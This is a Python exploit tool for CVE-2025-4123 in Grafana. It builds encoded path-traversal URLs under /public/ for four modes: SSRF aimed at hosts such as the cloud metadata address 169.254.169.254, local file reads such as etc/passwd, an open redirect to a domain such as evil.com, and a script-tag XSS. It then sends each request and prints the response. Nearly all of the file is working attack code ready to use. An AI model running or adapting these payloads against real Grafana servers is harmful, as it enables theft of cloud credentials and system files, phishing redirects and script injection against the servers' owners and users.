
# CVE-2025-4123 Exploit Tool
# Supports: SSRF, LFI, Open Redirect, XSS (Grafana public path bypass)

import requests

def banner():
    print("""
=========================================
 CVE-2025-4123 Exploit Tool (Grafana)
 Modes: SSRF, LFI, Open Redirect, XSS
 Payload base: /public/..%2F%5coast.pro%2F%3f%2F..%2F..
=========================================
""")

def test_payload(url):
    try:
        r = requests.get(url, timeout=10, allow_redirects=False)
        print(f"[+] Status Code: {r.status_code}")
        if r.status_code in [200]:
            print("[+] Response snippet:")
            print(r.text[:1000])
        elif r.status_code in [301, 302]:
            print(f"[!] Redirected to: {r.headers.get('Location')}")
        else:
            print("[!] Unexpected status.")
    except Exception as e:
        print(f"[!] Error: {e}")

def ssrf_mode(target):
    print("[SSRF] Using fixed payload structure with host substitution.")
    host = input("Enter SSRF host (e.g., 169.254.169.254): ").strip()
    path = input("Enter SSRF path (e.g., /latest/meta-data/): ").strip()
    payload = f"/public/..%2F%5C{host}{path}%2F%3f%2F..%2F.."
    full_url = target + payload
    print(f"[*] SSRF URL: {full_url}")
    test_payload(full_url)

def lfi_mode(target):
    print("[LFI] Using fixed base payload with file substitution.")
    file_path = input("Enter file path (e.g., etc/passwd): ").strip().replace("/", "%2F")
    payload = f"/public/..%2F%5coast.pro%2F%3f%2F..%2F..%2F..%2F{file_path}"
    full_url = target + payload
    print(f"[*] LFI URL: {full_url}")
    test_payload(full_url)

def redirect_mode(target):
    print("[Redirect] Using base payload to redirect to arbitrary domain.")
    domain = input("Enter external domain (e.g., evil.com): ").strip()
    payload = f"/public/..%2F%5C{domain}%2F%3f%2F..%2F.."
    full_url = target + payload
    print(f"[*] Redirect URL: {full_url}")
    test_payload(full_url)

def xss_mode(target):
    payload = "/public/%3Cscript%3Ealert('mitsec')%3C%2Fscript%3E"
    full_url = target + payload
    print(f"[*] XSS URL: {full_url}")
    test_payload(full_url)

def main():
    banner()
    target = input("Enter Grafana base URL (e.g., http://127.0.0.1:3000): ").strip()

    while True:
        print("\nChoose mode:")
        print("1. SSRF")
        print("2. LFI")
        print("3. Open Redirect")
        print("4. XSS")
        print("5. Exit")
        choice = input(">> ").strip()
        if choice == "1":
            ssrf_mode(target)
        elif choice == "2":
            lfi_mode(target)
        elif choice == "3":
            redirect_mode(target)
        elif choice == "4":
            xss_mode(target)
        elif choice == "5":
            break
        else:
            print("Invalid option.")

if __name__ == "__main__":
    main()
